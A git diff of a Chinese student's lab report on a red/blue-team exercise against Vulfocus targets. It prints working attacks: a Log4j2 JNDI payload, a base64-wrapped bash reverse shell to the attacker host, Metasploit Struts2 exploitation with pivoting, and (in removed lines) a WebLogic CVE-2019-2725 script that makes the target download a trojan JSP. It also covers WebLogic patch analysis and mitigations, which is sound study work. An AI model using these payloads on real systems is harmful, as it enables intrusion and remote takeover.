@@ -1,52 +1,17 @@
-<div align="center">
-<img src="https://rockoss-1309912377.cos.ap-beijing.myqcloud.com/picgo/facebook_cover_photo_2.png?q-sign-algorithm=sha1&q-ak=AKIDqVTxW5OWTJyPemjcRMLAl7J1WoulZPDs&q-sign-time=1690287389;9000000000&q-key-time=1690287389;9000000000&q-header-list=host&q-url-param-list=&q-signature=5ad935edc3b23375893975607977b9a25075e3cc" >
-<h1 align="center">
-    CUC网络安全攻防实践（Network-security-attack-and-defense-practice）
-    <h4>
-        2023年CUC网络安全攻防实践仓库
-    </h4>
-</h1>
-</div>
+# 2023暑期网络安全攻防实践记录报告
 
+## **负责工作**
 
-## 📜仓库说明
+- 制定分工计划
+- 作为红队完成漏洞存在性验证和漏洞利用
 
-本仓库基于[基础团队实践训练](https://c4pr1c3.github.io/cuc-wiki/cp/2023/index.html#_12)跟练复现完成的 [网络安全(2021) 综合实验](https://www.bilibili.com/video/BV1p3411x7da/) 。其中以红蓝队角色完成相应的网络攻防场景在线，其中主要是基于Vulfocus平台提供的靶场环境进行实验
+- 作为蓝队对漏洞攻击行为进行持续检测和威胁识别，并进行修复
 
-以下按本次实践训练所涉及到的人员能力集合划分了以下团队角色。一人至少承担一种团队角色。
+## 实践过程
 
-- 红队：需完成漏洞存在性验证和漏洞利用。
-
-- 蓝队威胁监测：漏洞利用的持续检测和威胁识别与报告。
-
-- 蓝队威胁处置：漏洞利用的缓解和漏洞修复（源代码级别和二进制级别两种）。
-
-上述能力的基本评分原则参考“道术器”原则：最基础要求是能够跟练并复现 [网络安全(2021) 综合实验](https://www.bilibili.com/video/BV1p3411x7da/) 中演示实验使用到的工具；进阶标准是能够使用课程视频中 **未使用** 的工具或使用编程自动化、甚至是智能化的方式完成漏洞攻击或漏洞利用行为识别与处置。
-
-### 分支说明
-
-- `main`分支存放项目最终实践报告
-- 其他各分支代表各组员个人实践报告、日志记录和代码文件
-
-## 📝实践达成指标
-
-- [x] 完成基础环境配置
-- [x] 红队实现对环境漏洞的挖掘，并利用漏洞实现攻击
-- [x] 蓝队对模拟场景下的出现的攻击进行检测和识别处理
-- [x] 蓝队完成对漏洞的缓解或修复
-- [x] 实现自动化脚本编写和检测工具
-
-## 📒项目日志
-
-项目实践日志请访问👉[记录日志](https://www.baichuanweb.cn/article/example-68)
-
-## 🚀实践过程
-
-### 1 环境搭建
+### 环境搭建
 
 > 万事开头难，只要肯攀登
-
-**[场景镜像文件](https://github.com/Xuyan-cmd/Network-security-attack-and-defense-practice/tree/main/code/%E5%A4%9A%E7%BD%91%E6%AE%B5%E6%B8%97%E9%80%8F%E5%9C%BA%E6%99%AF%E9%95%9C%E5%83%8F)**
 
 **1.配置虚拟机，调节网络环境**
 
@@ -56,10 +21,9 @@
 
 当然要完成红蓝攻防对抗，需要准备攻击者主机和靶机，直接使用多重加载镜像，能够有效简化整个实验过程：
 
-<img src="img/windows.png" alt="windows" style="zoom:67%;" />
+<img src="img/windows.png" alt="windows" style="zoom: 67%;" />
 
 同时为了使得挂载的两个虚拟机的ip地址不同，可以自行手动更新地址：
-
 <img src="img/peizhi.png" alt="peizhi" style="zoom: 50%;" />
 
 **2.从仓库中拉取到本机的虚拟机系统当中**：
@@ -160,13 +124,13 @@ sudo usermod -a -G docker ${USER}
 
 进入部署好的地址，能够看到对应的镜像列表等信息：
 
-![vulfocus-platform](img/vulfocus-platform.png)
+<img src="img/vulfocus-platform.png" alt="vulfocus-platform" style="zoom:50%;" />
 
 在镜像列表同步上游镜像，能够得到Vulfocus已经提供的镜像：
 
 ![cvetest](img/cvetest.png)
 
-![mirror list](img/mirror%20list.png)
+<img src="img/mirror%20list.png" alt="mirror list" style="zoom:50%;" />
 
 尝试下载镜像，并在容器中启动环境进行一定测试：
 
@@ -183,7 +147,6 @@ sudo usermod -a -G docker ${USER}
 ![Gateway configuration](img/Gateway%20configuration.png)
 
 攻击者主机通过暴露在“外网”的靶机漏洞从而渗透攻击DMZ区域，并将其作为跳板访问，依次利用漏洞访问到核心网内的靶机：
-
 ![Scene Topology](img/Scene%20Topology.png)
 
 在容器中启动场景，查看相应的镜像信息：
@@ -192,59 +155,15 @@ sudo usermod -a -G docker ${USER}
 
 完成上述步骤即构建了一个双层网段的渗透测试环境的模拟。
 
-**5.配置免密登录**
+### 漏洞验证和利用
 
-- __操作过程：__ 
+> 雄关漫道真如铁，而今迈步从头越。
 
-  - 打开 gitbash，输入操作代码：
+#### Log4j2-CVE-2021-44228漏洞
 
-  ```bash
-  $ ssh-keygen -t rsa 
-  # 提示输入东西时，连续按3次回车即可，在~/.ssh目录下生成了id_rsa和id_rsa.pub两个文件，后者上传至目标服务器。
-  # 但是因为已经生成过密钥文件了，这里就跳过这一步，权当是复习一遍之前的内容。
-  $ ssh-copy-id -i id_rsa.pub server_user@ipAddr
-  #server_user是服务器用户名，ipAddr是对应地址。
-  ```
-
-  ![ssh_keygen](img/ssh_keygen.png)
-
-  ![ssh-copy-id](img/ssh-copy-id.png)
-
-
-     - 在虚拟机上进行输入操作代码：
-     ```bash
-     $ vim /etc/ssh/sshd_config
-     #找到/etc/ssh/sshd_config这个文件，取消以下几行注释。
-     #PubkeyAuthentication yes
-     #AuthorizedKeysFile .ssh/authorized_keys
-     保存并退出vim：:x
-    
-     $ sudo service ssh restart
-     #重启服务
-     ```
-    
-     <img src="img/sshd_config.png" alt="sshd_config" style="zoom:50%;" />
-
-
-     - 在 gitbash 中输入操作代码：
-     ```bash
-     $ ssh username@ip
-     ```
-     即可免密登录虚拟机的 Linux 系统。
-
-
- ![ssh](img/ssh.png)
-
-在宿主机上实现远程免密登录确实会让实验操作更加便捷。
-
-### 2 单个独立漏洞验证和利用
-
-> 以 **log4j2 CVE-2021-44228** 为例
-
-#### 检测漏洞存在性
+##### 检测漏洞存在性
 
 在Vulfocus启动漏洞环境，镜像管理中搜索`Log4j2远程命令执行（CVE-2021-44228）`镜像并下载，完成后启动：
-
 ![Log4j2](img/Log4j2.png)
 
 浏览器访问该地址`192.168.56.109:11636`
@@ -272,13 +191,14 @@ sudo docker cp optimistic_blackwell:/demo/demo.jar ./
 
 - 反编译
 
+
 使用[jadx](https://github.com/skylot/jadx/releases/tag/v1.4.7)反编译demo.jar
 
 ![decompilejar](img/decompilejar.png)
 
-源码中有名为`Log4j2RceApplic`的类，其中正是违反了 "KISS" 原则，验证了该漏洞存在
+源码中有名为`Log4j2RceApplic`的类，验证该漏洞存在
 
-#### 验证漏洞可利用性
+##### 验证漏洞可利用性
 
 - 使用 `PoC` 手动测试
 
@@ -297,13 +217,13 @@ payload=${jndi:ldap://k5o9u7.dnslog.cn/exp}
 
 同时对payload字段进行**编码**，否则直接访问会导致400错误
 
-![burpget](img/burpget.png)
+![](img/burpget.png)
 
 在DNSLog网站成功接收到解析记录
 
-![getparsingrecord](img/getparsingrecord.png)
+![](img/getparsingrecord.png)
 
-#### 漏洞利用
+##### 漏洞利用
 
 攻击者主机attacker上下载[`JNDIExploit`工具](https://hub.fastgit.org/Mr-xn/JNDIExploit-1/releases/download/v1.2/JNDIExploit.v1.2.zip)
 
@@ -323,7 +243,7 @@ unzip JNDIExploit.v1.2.zip
 nc -l -p 7777
 ```
 
-![Startthelisteningport](img/Startthelisteningport.png)
+![](img/Startthelisteningport.png)
 
 应用工具JNDI-Injection-Exploit搭建服务，格式：
 
@@ -333,13 +253,13 @@ java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C “命令” -A “ip�
 
 这里的命令是想要靶机运行的命令，-A后放的是发出攻击的电脑的ip，也是存放-C后“命令”的ip地址。
 
-构造反弹shell的`payload`
+构造反弹shell的payload
 
 ```bash
 bash -i >& /dev/tcp/192.168.56.105/7777 0>&1
 ```
 
-将其进行**base64加密**
+将其进行base64加密
 
 ```tex
 YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjU2LjEwNS83Nzc3IDA+JjE=
@@ -351,7 +271,7 @@ YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjU2LjEwNS83Nzc3IDA+JjE=
 java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjU2LjEwNS83Nzc3IDA+JjE=}|{base64,-d}|{bash,-i}" -A 192.168.56.105
 ```
 
-![Startjavamonitoring](img/Startjavamonitoring.png)
+![](img/Startjavamonitoring.png)
 
 使用Burp Suite进行抓包，修改`GET 192.168.56.107:28490/hello?payload=111`的payload参数为上图框选的内容并进行编码
 
@@ -359,11 +279,11 @@ java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C "bash -c {echo,YmFzaCAt
 ${jndi:rmi://192.168.56.105:1099/5ekovi}
 ```
 
-![Modifypayloadparameters](img/Modifypayloadparameters.png)
+![](img/Modifypayloadparameters.png)
 
-发送后，即可发现攻击者主机的监听窗口反弹shell，查看 flag
+发送后，即可发现攻击者主机的监听窗口反弹shell
 
-![bounceshellwindow](img/bounceshellwindow.png)
+![](img/bounceshellwindow.png)
 
 查看flag
 
@@ -371,7 +291,7 @@ ${jndi:rmi://192.168.56.105:1099/5ekovi}
 ls /temp
 ```
 
-![getflag1](img/getflag1.png)
+![](img/getflag1.png)
 
 ```bash
 flag-{bmh20c56a41-fc29-44f1-9da4-0e3b7bbfb8ff}
@@ -379,11 +299,9 @@ flag-{bmh20c56a41-fc29-44f1-9da4-0e3b7bbfb8ff}
 
 在管理界面提交该flag通过
 
-![getflag2](img/getflag2.png)
+![](img/getflag2.png)
 
-### 3 场景化漏洞攻击
 
-> 以【**跨网段渗透**(常见的`dmz`)】为例
 
 
 
@@ -467,284 +385,205 @@ flag-{bmh20c56a41-fc29-44f1-9da4-0e3b7bbfb8ff}
 
 
 
-### 4 智能化漏洞威胁监测、漏洞攻击和缓解修复
 
-#### 异常流量检测与防护
 
-使用 Docker 的网络命名空间和网络抓包工具来捕获和分析流量。
 
-- 获取容器的 `PID`（进程ID）
 
-```bash
-# 查看容器运行情况
-docker ps
 
-docker inspect -f '{{.State.Pid}}' <container_name>
-# 请将 <container_name> 替换为要监视流量的容器的名称
-```
 
-![findPID](img/findPID.png)
+### 多网段渗透场景攻防
 
-- 使用 `nsenter` 命令进入容器的网络命名空间
+#### 外层（靶机1）
 
-```bash
-nsenter -t <container_pid> -n
-# 将 <container_pid> 替换为上一步中获取到的容器 PID
-```
+从模拟显示的角度来考虑，最外层的主机负责对外提供服务，于是直接得到了提供服务的端口号，也就是vulfocus平台上场景的入口端口
 
-- 使用网络抓包工具（如 `tcpdump` 或 `tshark`）来捕获和分析流量
+##### CVE-2020-17530 Struts2
 
-```bash
-tcpdump -i eth0 -w captured_traffic.pcap
-```
+我们启动场景后，查看当前运行的镜像：
 
-这将在容器的 `eth0` 网络接口上捕获流量，并将结果保存到 `captured_traffic.pcap` 文件中
+![dockerps](img/dockerps.png)
 
-![openmonitor](img/openmonitor.png)
+能够看到在Host-only网卡的本地地址的58841端口开启了`CVE-2020-17530 Struts2`的靶场环境，
 
-在`captured_traffic.pcap` 文件中可以查看到所有访问到容器的流量
+![attackcore](img/attackcore.png)
 
-![suspectedtraffic](img/suspectedtraffic.png)
-
-可以查看到疑似远程代码执行的攻击流量
-
-#### 自动化漏洞验证
-
-> 针对**Weblogic CVE-2019-2725**的自动化验证
-
-[**代码地址**](https://github.com/Xuyan-cmd/Network-security-attack-and-defense-practice/tree/main/code/Weblogic%20CVE-2019-2725_validation%20script)
-
-`CVE-2019-2725`是一个`Oracle weblogic`反序列化远程命令执行漏洞，这个漏洞依旧是根据`weblogic`的`xmldecoder`反序列化漏洞，通过针对Oracle官网历年来的补丁构造payload来绕过。
-
-**影响版本** ：
-`weblogic 10.x`
-`weblogic 12.1.3`
-
-在场景中访问中层网络靶机（已存放**Weblogic CVE-2019-2725**漏洞）
-
-![accesspath](img/accesspath.png)
-
-根据其漏洞特性构造[**POC代码**：](./src/poc.py)
-
-检测函数`checking(url)`中，脚本会发送GET请求到目标URL的`/_async/AsyncResponseService`路径，并检查响应状态码。如果状态码为200，表示目标存在CVE-2019-2725漏洞；否则，表示目标不受该漏洞影响。
-
-```python
-def checking(url):
-  try:
-    response = requests.get(url+filename)
-    if response.status_code == 200:
-      print('[+] {0} 存在CVE-2019-2725 Oracle weblogic 反序列化远程命令执行漏洞'.format(url))
-    else:
-      print('[-] {0} 不存在CVE-2019-2725 Oracle weblogic 反序列化远程命令执行漏洞'.format(url))
-  except Exception as e:
-    print("[-] {0} 连接失败".format(url))
-    exit()
-if options.FILE and os.path.exists(options.FILE):
-  with open(options.FILE) as f:
-    urls = f.readlines()
-    #print(urls)
-    for url in urls:
-      url = str(url).replace('\n','').replace('\r','').strip()
-      checking(url)
-elif options.FILE and not os.path.exists(options.FILE):
-  print('[-] {0} 文件不存在'.format(options.FILE))
-  exit()
-else:
-  #上传链接
-  url = options.URL+':'+options.PORT
-  checking(url)
-```
-
-**执行脚本**：
-
-```bash
-python3 poc.py -f IP_test.txt -p
-```
-
-![](../张健/img/poc.png)
-
-检测出存在`CVE-2019-2725`漏洞
-
-#### 智能化漏洞攻击方案
-
-##### Struts2-cve-2020-17530脚本构造
-
-**[代码地址](https://github.com/Xuyan-cmd/Network-security-attack-and-defense-practice/tree/main/code/Struts2-cve-2020-17530_attack%20script)**
-
-根据分析，Apache Struts 2是一个用于开发Java EE网络应用程序的开源网页应用程序架构。它利用并延伸了Java Servlet API，鼓励开发者采用MVC架构。
-
-如果开发人员使用了 `%{…}` 语法，那么攻击者可以通过构造恶意的 `OGNL` 表达式，引发 `OGNL` 表达式二次解析，最终造成远程代码执行的影响。
-
-因此这是一个远程代码执行漏洞，所以可以尝试构造对应的`OGNL`的表达式脚本来尝试攻击。
-
-在场景中，针对暴露的第二个靶机端口我们尝试进行攻击：
-
-![status repair](img/status repair.png)
-
-![The attack is back](img/The attack is back.png)
-
-根据前文中我们已经构造的payload：
+切换到攻击者主机并执行：
 
 ```shell
-http://192.168.1.110:8080/?id=%25%7b+%27test%27+%2b+(2000+%2b+20).toString()%7d
+# metasploit 基础配置
+# 更新 metasploit
+sudo apt install -y metasploit-framework
+# 初始化 metasploit 本地工作数据库
+sudo msfdb init
 ```
 
-尝试在代码中构造这一表达式：
+![datalab](img/datalab.png)
 
-![attackshell](img/attackshell.png)
+```shell
+# 启动 msfconsole
+msfconsole
+# 确认已连接 pgsql
+db_status
+# 建立工作区
+workspace -a demo
+```
 
-运行后，通过burp抓包能够得到：
+![metasploit](img/metasploit.png)
 
-![endingsone](img/endingsone.png)
+通过Metasploit工具的平台搜索struts2搜索CVE-2020-17530，如果是前者的话需要进行一点肉眼筛选，这次的漏洞编号说明是2020年的漏洞，于是可用的exploit只有2020年9月14日的：
 
-Getshell脚本的反弹命令需要进行进行编码转换，所以反弹shell可以使用https://www.ddosi.org/shell/ 在线工具平台转码：
+```shell
+Interact with a module by name or index. For example info 7, use 7 or use exploit/multi/http/struts_code_exec_parameters
+msf6 > search cve-2020-17530
 
-![urlfaccode](img/urlfaccode.png)
+Matching Modules
+================
 
-![finish_shell](img/finish_shell.png)
+   #  Name                                        Disclosure Date  Rank       Check  Description
+   -  ----                                        ---------------  ----       -----  -----------
+   0  exploit/multi/http/struts2_multi_eval_ognl  2020-09-14       excellent  Yes    Apache Struts 2 Forced Multi OGNL Evaluation
 
-对开放端口运行脚本，成功getshell：
 
-![finishshellattack](img/finishshellattack.jpg)
+Interact with a module by name or index. For example info 0, use 0 or use exploit/multi/http/struts2_multi_eval_ognl
+```
 
-##### Weblogic CVE-2019-2725 攻击脚本构造
+之后就是选用exploit，然后添加payload，这里选择和课件中一样的`cmd/unix/reverse_bash`，随后是options的设置阶段，设置rhosts为Victim主机的eth0网卡地址，rport则为平台上随机的端口，同时将payload中的lhost设置为Attacker主机的Host-Only网卡，之后就剩下输入run或者exploit执行。
 
-[**代码地址**](https://github.com/Xuyan-cmd/Network-security-attack-and-defense-practice/tree/main/code/Struts2-cve-2020-17530_attack%20script)
+随后只需要等待exploit运行完成，payload中的反弹bash会自动开启，接下来就是`ls /tmp`查看flag了：
 
-首先定义HTTP请求的headers和data
+![attack](img/attack.png)
 
-```python
-headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:93.0) Gecko/20100101 Firefox/93.0',
-           'SOAPAction': 'Accept: */*',
-           'User-Agent': 'Apache-HttpClient/4.1.1 (java 1.5)',
-           'content-type': 'text/xml'}
-data = '''<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:wsa="http://www.w3.org/2005/08/addressing"
-xmlns:asy="http://www.bea.com/async/AsyncResponseService">
-<soapenv:Header>
-<wsa:Action>xx</wsa:Action>
-<wsa:RelatesTo>xx</wsa:RelatesTo>
-<work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
-<void class="java.lang.ProcessBuilder">
-<array class="java.lang.String" length="3">
-<void index="0">
-<string>/bin/bash</string>
-</void>
-<void index="1">
-<string>-c</string>
-</void>
-<void index="2">
-<string>wget {0} -O servers/AdminServer/tmp/_WL_internal/bea_wls9_async_response/{1}/war/3.jsp</string>
-</void>
-</array>
-<void method="start"/></void>
-</work:WorkContext>
-</soapenv:Header>
-<soapenv:Body>
-<asy:onAsyncDelivery/>
-</soapenv:Body></soapenv:Envelope>'''.format(options.LOCATE, route(url + url_route + '?info'))
+#### 中层（靶机 2-4）
+
+##### weblogic-cve-2019-2725
+
+当拿到外层主机的shell之后是需要对外层主机所在内部网络进行扫描，尝试找出进一步向深层进发的跳板主机，需要做的5个步骤大概是如下内容：
+
+1. 对已攻入主机所在内网网段中其他主机进行存活验证
+
+2. 对存活的其他主机进行端口扫描
+
+3. 对已开放端口号进行信息收集，得到开放的服务的信息
+
+4. 从开放的服务入手获取版本寻找可用的漏洞
+
+5. 确定漏洞，装载payload，exploit
+
+首先是将已经获得的1号会话即外层主机shell升级为meterpreter，说是升级并且执行的命令也是`sessions -u 1`，其实是通过上传名为`post/multi/manage/shell_to_meterpreter`的payload的方式开启更多功能的会话：
+
+```shell
+Active sessions
+===============
+
+  Id  Name  Type                   Information          Connection
+  --  ----  ----                   -----------          ----------
+  1         shell cmd/unix                              192.168.56.107:4444 -> 192.168.56.1:60604 (172.29.108.146)
+  2         meterpreter x86/linux  root @ 192.171.84.4  192.168.56.107:4433 -> 192.168.56.1:60598 (172.29.108.146)
 
 ```
 
-获取WebLogic中间件版本目录
+主要的还是需要用meterpreter实现让外层的主机作为中介路由，将下一步内网扫描的包转发过去，此时会用到`post/multi/manage/autoroute`模块，只需要将会话ID填入即可，之后运行便会自动添加路由信息到Metasploit的路由表中：
 
-```python
-#获得weblogic中间的版本目录
-def route(url):
-  print('[*] 获得路径中')
-  try:
-    #print('[*] 目标地址:'+url)
-    respond = requests.get(url)
-    if respond.status_code == 200:
-      route = str(respond.text)
-      start = route.index('async_response/')
-      #print(start)
-      if start >= 0:
-        start += len('async_response/')
-      #print(start)
-      end = route.index('/war')
-      #print(end)
-      #print(route[start:end])
-      return route[start:end];
-    else:
-      print("[-] 路径获取失败")
-      exit()
-  except Exception as e:
-    print("[-]{0}连接失败".format(url))
-    exit()
+```shell
+Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   CMD      autoadd          yes       Specify the autoroute command (Accepted: add, autoadd, print, delete, default)
+   NETMASK  255.255.255.0    no        Netmask (IPv4 as "255.255.255.0" or CIDR as "/24"
+   SESSION  2                yes       The session to run this module on
+   SUBNET                    no        Subnet (IPv4, for example, 10.10.10.0)
+
+
+View the full module info with the info, or info -d command.
+
+msf6 post(multi/manage/autoroute) > run
+
+[!] SESSION may not be compatible with this module:
+[!]  * incompatible session platform: linux
+[*] Running module against 192.171.84.4
+[*] Searching for subnets to autoroute.
+[*] Did not find any new subnets to add.
+[*] Post module execution completed
+msf6 post(multi/manage/autoroute) > route
+
+IPv4 Active Routing Table
+=========================
+
+   Subnet             Netmask            Gateway
+   ------             -------            -------
+   192.171.84.0       255.255.255.0      Session 2
+
+[*] There are currently no IPv6 routes defined.
+msf6 post(multi/manage/autoroute) >
 ```
 
-实现发送HTTP请求，获得WebLogic中间件版本目录
+之后的顺序应该为先进行存活验证后进行端口扫描，如此可以通过存活性筛除掉不必要的IP地址，可以让端口扫描更快速更高效，这里选择使用模块`post/multi/gather/ping_sweep`，填入必要的options之后就可以进行扫描了：
 
-从攻击者http服务器中下载木马文件
+```shell
+Module options (post/multi/gather/ping_sweep):
 
-```python
-def acquire(url):
-  print('[*] 目标地址:'+url)
-  print('[*] 攻击者地址:'+options.LOCATE)
-  try:
-    respond = requests.post(url+url_route,headers=headers,data = data)
-    #print(respond.status_code)
-    if respond.status_code == 202:
-      print('[+] 木马下载成功')
-    else:
-      print('[-] 下载失败')
-      exit()
-  except Exception as e:
-    print("[-]{0}连接失败".format(url))
-    exit()
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   RHOSTS                    yes       IP Range to perform ping sweep against.
+   SESSION                   yes       The session to run this module on
+
+
+View the full module info with the info, or info -d command.
+
+msf6 post(multi/gather/ping_sweep) > set rhosts 192.171.84.2-254
+rhosts => 192.171.84.2-254
+msf6 post(multi/gather/ping_sweep) > set session 2
+session => 2
+msf6 post(multi/gather/ping_sweep) > run
+
+[*] Performing ping sweep for IP range 192.171.84.2-254
+[+]     192.171.84.5 host found
+[+]     192.171.84.3 host found
+[+]     192.171.84.4 host found
+[+]     192.171.84.2 host found
+[*] Post module execution completed
 ```
 
-本地启动简易的http服务器，代理木马文件attackjsp.txt
 
-```
-python3 -m http.server 8000
-```
 
-![Starttheserverlocally](img/Starttheserverlocally.png)
 
-部署好木马服务器后执行攻击脚本
 
-```bash
-python3 exp.py -u <target_url> -p <target_port> -l <service_script>
-#<target_url> 替换为目标的URL地址，<target_port> 替换为目标的端口号，<service_script> 替换为服务脚本的位置。
-```
+##### nginx-php-flag
 
-![expattacker](img/expattacker.png)
 
-木马服务器显示收到请求
 
-![mumafuwuqi](img/mumafuwuqi.png)
 
-此时查看受害者服务器中是否下载了木马程序
 
-```bash
-docker ps
-docker exec -it ec8fb7023c85 bash
 
-cd user_projects/domains/base_domain/servers/AdminServer/tmp/_WL_internal/bea_wls9_async_response/8tpkys/war
-```
 
-![findjsp](img/findjsp.png)
 
-#### 漏洞的缓解和修复
 
-##### Weblogic-cve-2019-2725代码层面漏洞分析和修复
 
-[**代码地址**](https://github.com/Xuyan-cmd/Network-security-attack-and-defense-practice/tree/main/code/Weblogic-cve-2019-2725_fix%20code/FixDemo(cve-2019-2725))
 
-通过我们在场景中的复现能够清楚看到，`Weblogic-cve-2019-2725`的漏洞源于在反序列化处理输入信息的过程中存在缺陷，未经授权的攻击者可以发送精心构造的恶意 HTTP 请求，利用该漏洞获取服务器权限，实现远程代码执行。
+
+
+
+
+
+
+### 漏洞威胁监测和缓解修复
+
+> 欲穷千里目，更上一层楼
+
+#### weblogic-cve-2019-2725漏洞修复
+
+通过我们在场景中的复现能够清楚看到，Weblogic-cve-2019-2725的漏洞源于在反序列化处理输入信息的过程中存在缺陷，未经授权的攻击者可以发送精心构造的恶意 HTTP 请求，利用该漏洞获取服务器权限，实现远程代码执行。
 
 我们从Oracle官方漏洞复现源拿到漏洞镜像，根据Oracle的漏洞报告，此漏洞存在于异步通讯服务，通过访问路径`/_async/AsyncResponseService`，判断不安全组件是否开启。`wls9_async_response.war`包中的类由于使用注解方法调用了Weblogic原生处理Web服务的类，因此会受该漏洞影响：
 
-![Bug fixes](img/Bug fixes.png)
+![Bug fixes](img/Bug%20fixes.png)
 
 我们继续分析漏洞是如何发送http请求从而获得权限的，在`ProcessBuilder`类中打下断点，可以看到相应的调用栈过程：
 
-![calling procedure](img/calling procedure.png)
+![calling procedure](img/calling%20procedure.png)
 
 我们逐步分析，首先程序是继承自`HttpServlet`的`BaseWSServlet`类，其中的service方法主要用于处理HTTP请求及其响应，通过HTTP协议发送的请求包封装在`HttpServletRequest`类的实例化对象`var1`中
 
-![underlying code logic](img/underlying code logic.png)
+![underlying code logic](img/underlying%20code%20logic.png)
 
 调用`BaseWSServlet`中定义的内部类`AuthorizedInvoke`的`run()`方法完成传入HTTP对象的权限验证过程：
 
@@ -754,7 +593,7 @@ cd user_projects/domains/base_domain/servers/AdminServer/tmp/_WL_internal/bea_wl
 
 ![linecontent](img/linecontent.png)
 
-HTTP请求发送至`SoapProcessor`类的`handlePost`方法：
+HTTP请求发送至SoapProcessor类的handlePost方法：
 
 ```java
 private void handlePost(BaseWSServlet var1, HttpServletRequest var2, HttpServletResponse var3) throws IOException {
@@ -764,6 +603,7 @@ private void handlePost(BaseWSServlet var1, HttpServletRequest var2, HttpServlet
     String var5 = var4.getWsdlPort().getBinding().getBindingType();
     HttpServerTransport var6 = new HttpServerTransport(var2, var3);
     WsSkel var7 = (WsSkel)var4.getEndpoint();
+
     try {
         Connection var8 = ConnectionFactory.instance().createServerConnection(var6, var5);
         var7.invoke(var8, var4);
@@ -777,7 +617,7 @@ private void handlePost(BaseWSServlet var1, HttpServletRequest var2, HttpServlet
 
 **SOAP是一种通信协议**，用于应用程序之间的通信。它是一种轻量的、简单的、基于XML的协议，可以独立于平台和语言进行通信。SOAP定义了数据交互中如何传递消息的规则，比如在HTTP中规定了POST请求的传参方式，在数据类型不同的情况下可以使用不同的参数方式。
 
-![soap](img/soap.png)
+<img src="img/soap.png" alt="soap" style="zoom:50%;" />
 
 在整个进程调用中，`BaseWSServlet`类实例化对象`var1`封装了基于HTTP协议的SOAP消息：
 
@@ -787,7 +627,7 @@ private void handlePost(BaseWSServlet var1, HttpServletRequest var2, HttpServlet
 
 ![var4](img/var4.png)
 
-通过上述漏洞调用过程分析，要想有效修复漏洞，需要开发补丁,最直接的方法是在路径`weblogic/wsee/workarea/WorkContextXmlInputAdapter.java`中添加了`validate`方法，即在调用`startElement`方法解析XML的过程中，如果解析到`Element`字段值为`Object`就抛出异常：
+通过上述漏洞调用过程分析，要想有效修复漏洞，需要开发补丁,最直接的方法是在路径weblogic/wsee/workarea/WorkContextXmlInputAdapter.java中添加了validate方法，即在调用startElement方法解析XML的过程中，如果解析到Element字段值为Object就抛出异常：
 
 ```java
 private void validate(InputStream is) {
@@ -811,7 +651,7 @@ private void validate(InputStream is) {
    }
 ```
 
-然而，采用黑名单的防护措施很快就被POC轻松绕过，因为其中不包含任何`Object`元素。尽管经过`XMLDecoder`解析后，这种方法仍然会导致远程代码执行，例如给出一段poc：
+然而，采用黑名单的防护措施很快就被POC轻松绕过，因为其中不包含任何Object元素。尽管经过XMLDecoder解析后，这种方法仍然会导致远程代码执行，例如给出一段poc：
 
 ```java
 <java version="1.4.0" class="java.beans.XMLDecoder">
@@ -823,9 +663,7 @@ private void validate(InputStream is) {
 
 因为其中不包含任何Object元素，但经`XMLDecoder`解析后依旧造成了远程代码执行
 
-因此，我们需要将更多的关键字漏洞加入到黑名单中，从而做到当程序解析到关键字属性的字样时，即设置为异常，object、new、method关键字继续加入到黑名单中，一旦解析XML元素过程中匹配到上述任意一个关键字就立即抛出运行时异常。
-
-但是针对void和array这两个元素是有选择性的抛异常，其中当解析到void元素后，还会进一步解析该元素中的属性名，若没有匹配上index关键字才会抛出异常。而针对`array`元素而言，在解析到该元素属性名匹配class关键字的前提下，还会解析该属性值，若没有匹配上byte关键字，才会抛出运行时异常：
+因此，我们需要将更多的关键字漏洞加入到黑名单中，从而做到当程序解析到关键字属性的字样时，即设置为异常，object、new、method关键字继续加入到黑名单中，一旦解析XML元素过程中匹配到上述任意一个关键字就立即抛出运行时异常。但是针对void和array这两个元素是有选择性的抛异常，其中当解析到void元素后，还会进一步解析该元素中的属性名，若没有匹配上index关键字才会抛出异常。而针对array元素而言，在解析到该元素属性名匹配class关键字的前提下，还会解析该属性值，若没有匹配上byte关键字，才会抛出运行时异常：
 
 ```java
 public void startElement(String uri, String localName, String qName, Attributes attributes) throws SAXException {
@@ -864,11 +702,11 @@ public void startElement(String uri, String localName, String qName, Attributes 
 
 - **配置URL访问控制策略**
 
-  部署于公网的WebLogic服务器，可通过ACL禁止对`/_async/`*及`/wls-wsat/`*路径的访问。
+  部署于公网的WebLogic服务器，可通过ACL禁止对/_async/*及/wls-wsat/*路径的访问。
 
 - **删除不安全文件**
 
-  - 删除`wls9_async_response.war`与`wls-wsat.war`文件及相关文件夹，并重启Weblogic服务。具体文件路径如下：
+  - 删除wls9_async_response.war与wls-wsat.war文件及相关文件夹，并重启Weblogic服务。具体文件路径如下：
 
     10.3.*版本：
 
@@ -876,13 +714,47 @@ public void startElement(String uri, String localName, String qName, Attributes 
     \Middleware\wlserver_10.3\server\lib\%DOMAIN_HOME%\servers\AdminServer\tmp\_WL_internal\%DOMAIN_HOME%\servers\AdminServer\tmp\.internal\
     ```
 
-### 🔍参考材料
+#### 自动化攻击脚本编写（struts2-cve-2020-17530）
 
-- [网络安全(2021)综合实验](https://www.bilibili.com/video/BV1p3411x7da/?p=22&spm_id_from=pageDriver&vd_source=61a1cf010feeebc60643481f16fc695e)
-- [cuc-ns-ppt](https://c4pr1c3.github.io/cuc-ns-ppt/vuls-awd.md.v4.html#/title-slide)
+根据分析，Apache Struts 2是一个用于开发Java EE网络应用程序的开源网页应用程序架构。它利用并延伸了Java Servlet API，鼓励开发者采用MVC架构。
 
-- [Vulfocus 镜像维护目录](https://github.com/fofapro/vulfocus/blob/master/images/README.md)
+如果开发人员使用了 `%{…}` 语法，那么攻击者可以通过构造恶意的 `OGNL` 表达式，引发 `OGNL` 表达式二次解析，最终造成远程代码执行的影响。
+
